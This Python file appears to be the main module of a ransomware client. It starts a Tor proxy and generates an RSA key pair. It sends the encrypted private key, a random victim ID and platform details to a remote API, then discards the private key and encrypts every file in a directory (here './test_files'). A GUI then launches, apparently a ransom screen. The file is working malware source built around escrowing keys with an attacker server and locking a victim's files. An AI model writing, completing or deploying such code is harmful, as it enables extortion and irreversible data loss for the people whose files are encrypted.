from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.backends import default_backend
from PyQt5.QtWidgets import QApplication
from RSA.RSAKeyGen import RSAKeyGen
import base64
import sys
import platform
import uuid
import Config
import json
from pathlib import Path
from Helper import Helper
from FileCrypter import FileCrypter
from TorManager import TorManager
from GUI import GUI

_helper = Helper()
_session = 0


def init():
    global _session
    tor = TorManager()
    tor.startProxy()
    _session = tor.getSession()
    id = genKeyPair()
    app = QApplication(sys.argv)
    oMainwindow = GUI(id)
    sys.exit(app.exec_())


def genKeyPair():
    keys = RSAKeyGen()
    _helper.info("Keys generated!")
    cipher_cpriv_key = base64.b64encode(encryptClientPrivKey(keys.getPrivateKeyAsStr()))
    #send key and sys info to API
    os_info = platform.platform()
    unique_id = str(uuid.uuid4())
    data = {
        'hwid': unique_id,
        'priv_key': cipher_cpriv_key.decode('utf-8'),
        'platform': os_info
    }
    headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
    req = _session.post(Config.API_URL + "/users/add", data=json.dumps(data), headers=headers)
    _helper.debug("Got Response from /users/add => " + str(req.json()))
    keys.forgetPrivate()

    pathlist = Path('./test_files').glob('**/*')
    for path in pathlist:
        path_in_str = str(path)
        fc = FileCrypter()
        try:
            fc.encrypt_file(path_in_str, keys.getPublicKeyAsStr())
            _helper.info("Encrypted " + path_in_str)
        except IOError:
            _helper.error("Could not encrypt " + path_in_str)

    return unique_id


def encryptClientPrivKey(priv_key):
    """Encrypt the Clients private key (given as a str) with the servers public key"""
    with open(_helper.path('./server.public.key'), "rb") as key_file:
        public_key = serialization.load_ssh_public_key(
            key_file.read(),
            backend=default_backend()
        )
        key_file.close()

    cipher = public_key.encrypt(
        bytes(priv_key, 'utf-8'),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA1(),
            label=None
        )
    )
    _helper.info("Private Client Key is encrypted")
    return cipher


if __name__ == "__main__":
    _helper.info("Program started")
    init()
